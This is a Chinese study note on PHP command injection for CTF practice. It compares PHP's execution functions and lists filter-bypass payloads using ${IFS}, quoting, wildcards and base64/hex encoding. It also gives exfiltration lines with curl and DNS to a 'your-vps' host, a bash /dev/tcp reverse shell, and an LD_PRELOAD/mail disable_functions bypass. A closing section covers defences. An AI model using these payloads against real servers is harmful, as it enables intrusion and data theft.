# PHP 命令执行与绕过

> 来源：task10 —— PHP 命令执行与绕过（1 day）
> 本文所有**函数行为**和**绕过手法**均在 PHP 8.4.24 / Kali 上实测
> CTFHub RCE 模块通关记录见本文末尾（待补）

---

## 一、为什么会有命令执行

**根因：把用户输入拼进了"要交给系统执行"的字符串。**

```php
// 危险写法
system("ping -c 1 " . $_GET['ip']);
```

```
用户输入: 127.0.0.1; cat /flag
拼出来的: ping -c 1 127.0.0.1; cat /flag
                          ↑
                    分号 = 命令分隔符 → 第二条命令被执行
```

**两种层面：**

| 层面 | 执行什么 | 函数 |
|---|---|---|
| **系统命令执行** | 交给 shell（`/bin/sh`）跑 | `system` / `exec` / `shell_exec` / `passthru` / `popen` / `proc_open` / 反引号 |
| **代码执行** | 交给 PHP 解释器跑 | `eval` / `assert` / `create_function` / `preg_replace(/e)` / `call_user_func` / `array_map` … |

**系统命令执行的危险性更高**：它直接拿到 shell，可以做任何事（读文件、反弹 shell、内网横向）。

---

## 二、系统命令执行函数大全（实测）

### 2.1 核心 7 个 + 反引号

**实测环境**：PHP 8.4.24，命令 `echo line1; echo line2; id -un`

| 函数 | 直接回显 | 返回值 | 多行 | 退出码 |
|---|---|---|---|---|
| **`system()`** | **✅ 有** | `string`（最后一行） | ✅ | ✅ 第 2 参数 |
| **`exec()`** | ❌ 无 | `string`（最后一行） | 需第 2 参数（数组） | ✅ 第 3 参数 |
| **`shell_exec()`** | ❌ 无 | `string`（**全部输出**） | ✅ | ❌ |
| **`` `反引号` ``** | ❌ 无 | `string`（**全部输出**） | ✅ | ❌ |
| **`passthru()`** | **✅ 有**（原始二进制） | `null` | ✅ | ✅ 第 2 参数 |
| **`popen()`** | ❌ 无 | `resource`（文件指针） | ✅ `fread` | ✅ `pclose` |
| **`proc_open()`** | ❌ 无 | `resource`（进程句柄） | ✅ 管道 | ✅ `proc_close` |
| **`pcntl_exec()`** | **✅ 有** | 无（**替换进程**） | ✅ | ❌ |

### 2.2 实测输出对照

```
命令: echo line1; echo line2; id -un

system             回显: line1\nline2\nkali\n      返回: 'kali'                 退出码=0
exec               回显: （空）                      返回: 'kali'                 退出码=0  数组=["line1","line2","kali"]
shell_exec         回显: （空）                      返回: 'line1\nline2\nkali\n'
passthru           回显: line1\nline2\nkali\n      返回: NULL                   退出码=0
反引号 `cmd`       回显: （空）                      返回: 'line1\nline2\nkali\n'
popen+pclose       回显: （空）                      返回: 'line1\nline2\nkali\n' 退出码=0
proc_open          回显: （空）                      返回: 'line1\nline2\nkali\n' 退出码=0
```

**关键结论：**

```
【直接回显】结果直接进响应体，不需要变量接
    system / passthru / pcntl_exec

【返回结果】结果装进变量，要 echo 才显示
    exec（末行）/ shell_exec（全部）/ 反引号（全部）

【返回句柄】给你个指针，自己读
    popen / proc_open
```

### 2.3 逐个详解

#### `system($cmd, &$ret)`

```php
system("whoami");        // 直接输出 kali
```

- **PHP 4+**
- **边执行边输出**（不是等命令跑完）
- 返回**最后一行**（失败返回 `false`）
- **只有它能拿退出码还回显**

#### `exec($cmd, &$output, &$ret)`

```php
echo exec("whoami");                              // kali
exec("ls -la", $lines, $rc);                      // $lines = 所有行（数组）
```

- **不回显**
- 返回**最后一行**
- **第 2 参数装所有行**（数组）→ 想看多行必须用它
- 第 3 参数拿退出码

#### `shell_exec($cmd)`

```php
echo shell_exec("ls");     // 全部输出（字符串）
```

- **不回显**
- 返回**全部输出**（`\n` 分隔的字符串）
- **命令无输出时返回 `null`**（不是空串！）
- 反引号 `` `cmd` `` 是它的语法糖

#### `passthru($cmd, &$ret)`

```php
passthru("cat /bin/ls");   // 直接输出原始二进制
```

- **回显**
- 返回 `null`
- **输出原始二进制**（适合处理图片/压缩包）
- 也能拿退出码

#### `popen($cmd, $mode)`

```php
$h = popen("ls", "r");
while (!feof($h)) { echo fread($h, 4096); }
pclose($h);                 // 拿退出码
```

- 返回**文件指针**
- `$mode = "r"` 读命令输出 / `"w"` 写入命令 stdin
- **`pclose()` 才拿退出码**

#### `proc_open($cmd, $desc, &$pipes)`

```php
$desc = [1 => ['pipe','w'], 2 => ['pipe','w']];
$p = proc_open("ls", $desc, $pipes);
echo stream_get_contents($pipes[1]);   // stdout
echo stream_get_contents($pipes[2]);   // stderr ← 这个 popen 做不到
proc_close($p);
```

- **最强**：能分别拿到 stdout / stderr / stdin
- 能设置环境变量、工作目录
- **`proc_close()` 拿退出码**

#### `pcntl_exec($path, $args, $env)`

```php
pcntl_exec("/bin/ls", ["-la"]);
```

- **直接把当前 PHP 进程替换成目标程序**
- 之后的 PHP 代码**不会执行**
- 需要 `pcntl` 扩展（CLI 常见，FPM 通常没有）

#### 反引号 `` `cmd` ``（执行运算符）

```php
echo `whoami`;      // 等同 shell_exec("whoami")
```

**注意**：反引号在 HTML 里容易被当成引号，在 `sql` 里是标识符 —— **实战里要小心上下文**。

### 2.4 怎么选（速查）

| 需求 | 用哪个 |
|---|---|
| **要立刻看到结果**（CTF 最常见） | **`system`** |
| 结果要处理/过滤 | `shell_exec`（全部字符串） |
| 要多行（数组） | `exec` + 第 2 参数 |
| **要退出码** | `system` / `exec` / `passthru` |
| 要 stderr | `proc_open` |
| 双向交互（写 stdin） | `popen("w")` / `proc_open` |
| **无回显时** | `exec` / `shell_exec` 拿返回值，再外带 |

---

## 三、代码执行类函数（不是系统命令，但同样是 RCE）

| 函数 | 说明 | 版本限制 |
|---|---|---|
| **`eval($code)`** | 执行任意 PHP 代码（**语言结构**，不是函数） | 全版本 |
| **`assert($code)`** | 老版本可执行字符串 | **PHP 7.2+ 不再执行字符串** |
| **`create_function($args, $code)`** | 动态造函数 | PHP 7.2 废弃，8 移除 |
| **`preg_replace($p, $r/e, $s)`** | `/e` 修饰符执行替换结果 | **PHP 7 移除** |
| **`call_user_func($cb, ...)`** | 回调调用 | 全版本 |
| **`call_user_func_array($cb, $arr)`** | 同上 | 全版本 |
| **`array_map($cb, $arr)`** | 对每个元素调 `$cb` | 全版本 |
| **`array_filter($arr, $cb)`** | 同上 | 全版本 |
| **`array_reduce($arr, $cb, $init)`** | 同上 | 全版本 |
| **`usort($arr, $cb)` / `uasort`** | 排序回调 | 全版本 |
| **`ob_start($cb)`** | 输出缓冲回调 | 全版本 |
| **`include` / `require`** | 文件包含（配合伪协议 = RCE） | 全版本 |
| `preg_replace_callback` | 回调执行 | 全版本 |
| `mb_ereg_replace` 的 `/e` | 同上 | 已移除 |
| `include_once` / `require_once` | 同上 | 全版本 |

**实测（PHP 8.4）：**

```php
eval("system('id');");                    // ✅ 有输出
assert("system('id');");                  // ❌ 8.x 不执行字符串
create_function('', 'system("id");');     // ❌ 8.x 已移除
preg_replace('/.*/e', 'system("id")', ''); // ❌ 7.x 已移除
call_user_func('system', 'id');           // ✅ 有输出
array_map('system', ['id']);              // ✅ 有输出
```

**`assert` 在 PHP 8 里 `function_exists` 是 true，但**传字符串不再执行** —— 这是常见坑。

---

## 四、其它可注入命令的地方（不局限上面这些）

| 位置 | 说明 | 备注 |
|---|---|---|
| **`mail($to,$sub,$msg,$hdr,$param)`** | 第 5 参数传给 `sendmail` | 常配合 `putenv` + `LD_PRELOAD` |
| **`putenv("LD_PRELOAD=/tmp/x.so")`** | 设置环境变量，劫持动态库 | 需要能上传 `.so` |
| **`imap_open($mailbox,...)`** | mailbox 参数可注入 | 需 `imap` 扩展 |
| **`curl_exec()`** | 访问 URL（SSRF，不是命令执行） | 但能打内网 |
| **`fsockopen()`** | 原始 socket | 同上 |
| **`file_get_contents("http://...")`** | 同上 | |
| **`dl()`** | 加载 PHP 扩展 | 需 `enable_dl=On` |
| **`error_log($msg, 1, $to)`** | `$to` 传给 `sendmail` | 同 `mail` |
| **`mb_send_mail`** | 同 `mail` | |
| **`pcntl_exec`** | 见上 | |
| **`ldap_*`** | 老版本有注入 | 少见 |
| **`ImageMagick` 的 `convert`** | 通过文件名注入 | `imagemagick` 漏洞 |

---

## 五、绕过方式大全（实测）

### 5.1 空格绕过

**目标**：让 `cat /flag` 里的空格不被过滤。

**实测（PHP 8.4 + shell）：**

| 手法 | payload | 实测 |
|---|---|---|
| **`${IFS}`** | `cat${IFS}/flag` | ✅ |
| **`$IFS$9`** | `cat$IFS$9/flag` | ✅ |
| **花括号** | `{cat,/flag}` | ✅ |
| **`<` 重定向** | `cat</flag` | ✅ |
| **制表符 `%09`** | `cat%09/flag` | ✅ |
| `$'\t'` | `cat$'\t'/flag` | ✅ |
| `$'\x20'` | `cat$'\x20'/flag` | ✅ |
| `%20` | `cat%20/flag` | ✅（最普通） |

**⚠️ 一个反直觉的实测结果：**

```
空格   (0x20) → ✅ 当空格用
制表   (0x09) → ✅ 当空格用
换行   (0x0a) → ❌ 不是空格 —— 它是【命令分隔符】
回车   (0x0d) → ❌
垂直制表 (0x0b) → ❌
换页   (0x0c) → ❌
```

**所以 `%0a` 是"分隔两条命令"，不是"当空格"。** 这两个用途不同：

```
cat%0a/flag       → cat 和 /flag 分成两条命令 → 报错
cat${IFS}/flag    → cat 接收 /flag 这个参数    → 正确
```

**`${IFS}` 是什么**：`IFS` = Internal Field Separator，shell 的字段分隔符（默认是空格+制表+换行）。`${IFS}` 展开成它 → 一个空格。

**`$IFS$9` 为什么要 `$9`**：直接 `cat$IFS/flag` 会被解析成 `$IFS/flag`（变量名吃到 `/`），加 `$9`（第 9 个位置参数，通常为空）截断变量名。

### 5.2 关键字绕过

**目标**：不写出完整的 `cat` / `flag`。

**实测：**

| 手法 | payload | 实测 |
|---|---|---|
| **反斜杠** | `ec\ho` | ✅ |
| **单引号** | `ec''ho` | ✅ |
| **双引号** | `ec""ho` | ✅ |
| **变量拼接** | `a=ec;b=ho;$a$b` | ✅ |
| **通配符 `?`** | `/bin/ec?o` | ✅ |
| **通配符 `*`** | `/bin/e*` | ⚠️ 会匹配到多个（`/bin/editor` 等）→ 失败 |
| **命令替换** | `$(echo ec)ho` | ✅ |
| **反引号** | `` `echo ec`ho `` | ✅ |

**⚠️ `*` 通配符的坑（实测）：**

```
/bin/e* → /bin/editor /bin/egrep /bin/elfedit /bin/enc2xs ... hello
        ↑ 匹配到一堆，第一个直接当命令跑 → 失败
```

**所以 `?` 比 `*` 安全**：`/bin/ec?o` 只有一个匹配。

**常用替换表：**

| 原字符 | 替代 |
|---|---|
| `cat` | `c\at` / `c'a't` / `c"a"t` / `/bin/c?t` / `$a$b` |
| `flag` | `fla?` / `fl*` / `f[l]ag` |
| `ls` | `l\s` / `l''s` |
| `空格` | `${IFS}` / `$IFS$9` / `<` / `%09` |
| `斜杠` | `${PATH:0:1}` |

**`${PATH:0:1}` 取斜杠** —— `$PATH` 是 `/usr/local/sbin:/usr/...`，第 0 位就是 `/`：

```bash
$ echo ${PATH:0:1}
/
```

### 5.3 命令分隔符

| 符号 | 行为 | 实测 |
|---|---|---|
| `;` | 顺序执行（不管前面成功失败） | ✅ |
| **`\|`** | **管道**：前者的输出给后者 | ✅ |
| `\|\|` | 前者失败才执行后者 | ✅ |
| `&&` | 前者成功才执行后者 | ✅ |
| `&` | 后台执行 | ✅ |
| `%0a` | 换行（= 分隔符） | ✅ |
| `` ` `` | 命令替换（结果作为参数） | ✅ |

**测出来的差异：**

```
echo a; echo b      → a b      （都执行）
echo a | cat        → a        （管道）
echo a || echo b    → a        （a 成功，b 不执行）
echo a && echo b    → a b      （a 成功，执行 b）
echo a & echo b     → b a      （顺序不定）
```

**CTF 里的选择：**

| 场景 | 用哪个 |
|---|---|
| 前面已经注入了参数，要接命令 | `;` |
| 前面可能失败（如 `ping` 不存在的 IP） | `\|\|` |
| 要接管道（如 `base64`） | `\|` |

### 5.4 编码绕过

**避开关键字过滤的三种编码：**

```php
// ① base64
system(base64_decode("aWQ="));           // id
echo shell_exec(base64_decode("Y2F0IC9mbGFn"));  // cat /flag

// ② hex
echo shell_exec(hex2bin("6964"));        // id
system(hex2bin("636174202f666c6167"));   // cat /flag

// ③ 反转字符串
system(strrev("galf/ tac"));             // cat /flag
```

**shell 层编码：**

```bash
# hex 转义
$'\x63\x61\x74' /flag                     # cat /flag

# base64 管道
echo 'Y2F0IC9mbGFn' | base64 -d | bash    # cat /flag

# printf 构造
$(printf '\x63\x61\x74') /flag
```

**实测：**

```
$ echo 'ZWNobyBoZWxsbw==' | base64 -d | bash   → hello   ✅
$ $'\x65\x63\x68\x6f' hello                    → hello   ✅
```

### 5.5 无回显怎么办（5 种）

**前提**：函数不回显（`exec` / `shell_exec`），且你**看不到返回值**（比如结果没被 echo 出来）。

#### ① 写文件到 web 目录

```bash
id > /var/www/html/o.txt
# 然后访问 http://target/o.txt
```

**前提**：知道 web 根路径 + 目录可写。

#### ② HTTP 外带

```bash
curl http://your-vps/?x=$(id | base64 -w0)
# 你看自己服务器的访问日志
```

**优点**：不用知道 web 路径，只要出网。

#### ③ DNS 外带

```bash
ping -c1 $(whoami).your-dns.com
# 看 DNS 解析日志
```

**优点**：出网限制严格时（只放行 DNS）也能用。

#### ④ 时间盲注

```bash
# 用条件判断 + sleep，靠响应时间区分真假
if [ $(whoami) = "root" ]; then sleep 5; fi
```

**逐字符盲注：**

```bash
if [ $(cut -c1 /flag) = "f" ]; then sleep 3; fi
```

#### ⑤ 反弹 shell（最直接）

```bash
bash -i >& /dev/tcp/your-vps/4444 0>&1
# 你机器上: nc -lvnp 4444
```

**实测（本机）**：`/dev/tcp` 在 bash 里可用，但在 `sh`（Debian 的 dash）里不可用 —— **要确认目标用的是哪个 shell**。

### 5.6 禁用函数（disable_functions）绕过

**背景**：`php.ini` 里 `disable_functions = system,exec,shell_exec,...` 之后，这些函数直接报错。

| 手法 | 原理 | 前提 |
|---|---|---|
| **`LD_PRELOAD` + `putenv` + `mail`** | 用 `mail()` 的第 5 参数触发 `sendmail`，`putenv` 设置 `LD_PRELOAD` 指向恶意 `.so`，`.so` 的构造函数里执行命令 | 能上传 `.so` + `putenv`/`mail` 没被禁 |
| **Apache Mod CGI** | 上传 `.htaccess` 启用 CGI，再上传脚本 | Apache + 允许 `.htaccess` |
| **PHP-FPM / FastCGI** | 通过 `LD_PRELOAD` 或 FastCGI 协议打 FPM | 能访问 FPM 端口 |
| **Shellshock（CVE-2014-6271）** | 老版本 bash 的 `BASH_ENV` 注入 | bash < 4.3 + CGI |
| **`imap_open`** | mailbox 参数注入 | `imap` 扩展 + 能出网 |
| **`pcntl_exec`** | 常被忘在 `disable_functions` 之外 | `pcntl` 扩展 |
| **`putenv` + `error_log`** | 同 `LD_PRELOAD` 思路 | |
| **`Windows COM`** | `new COM("WScript.Shell")` | Windows + `com.allow_dcom` |
| **`win32std`** | `win_exec` | Windows |
| **`bash` 的 `enable -f`** | 加载自定义内建命令 | 少见 |

**最常见的 CTF 场景：`LD_PRELOAD` + `mail()`**

```php
// 1. 上传恶意 .so（构造函数里执行命令）
// 2. 代码：
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.c", "s", "m", "", "-1");    // 触发 sendmail → 加载 .so
```

**限制**：`mail()` 的 `sendmail_path` 必须可用；`putenv` 不能被禁。

### 5.7 长度限制绕过

**场景**：payload 有长度上限（如 7 字符）。

```bash
# ① 写短文件，再执行
echo cat>/tmp/a        # 分多次写
echo /flag>>/tmp/a
sh /tmp/a

# ② 用单字母命令 + 通配符
ls
cat /f*

# ③ 编码后写入
echo Y2F0IC9mbGFn|base64 -d|sh

# ④ PHP 里用短标签 + 反引号
<?=`cat /flag`;?>
```

---

## 六、CTFHub RCE 模块通关记录

> ⏳ **待做** —— 需要开 CTFHub 实例

| 子题 | flag | 绕过了什么 |
|---|---|---|
| 命令注入 | | |
| 过滤 cat | | |
| 过滤空格 | | |
| 过滤目录分隔符 | | |
| 过滤运算符 | | |
| 综合 | | |

---

## 七、防御

| 层面 | 做法 |
|---|---|
| **不要拼字符串** | 用 `escapeshellarg()` / `escapeshellcmd()` |
| **白名单** | 只允许特定字符/格式（`filter_var($ip, FILTER_VALIDATE_IP)`） |
| **不用 shell** | `proc_open` 传数组形式（PHP 7.4+ 支持 `["cmd", "arg1"]`） |
| **禁用函数** | `disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec` |
| **最小权限** | web 用户不要能读 `/flag`、不要能出网 |
| **open_basedir** | 限制 PHP 能访问的目录 |

```php
// 危险
system("ping -c 1 " . $_GET['ip']);

// 稍好：转义
system("ping -c 1 " . escapeshellarg($_GET['ip']));

// 最好：白名单
if (!filter_var($_GET['ip'], FILTER_VALIDATE_IP)) { die('invalid'); }
system("ping -c 1 " . $_GET['ip']);
```

**⚠️ `escapeshellarg` 也不是万能的** —— 在 Windows 上有已知绕过（`%` 和 `!`）。

---

## 八、一句话总结

> **命令执行 = 把用户输入拼进了 shell 字符串。**
>
> **7 个函数的核心区别只有三句话：**
> **`system`/`passthru` 有回显，`exec`/`shell_exec` 无回显，`popen`/`proc_open` 给你句柄。**
>
> **绕过的本质是"shell 的语法比过滤规则更丰富"：**
> **空格有 8 种写法，关键字能拆能拼能编码，分隔符有 6 个。**
>
> **只要还有一个字符没被过滤，就能构造出命令。**
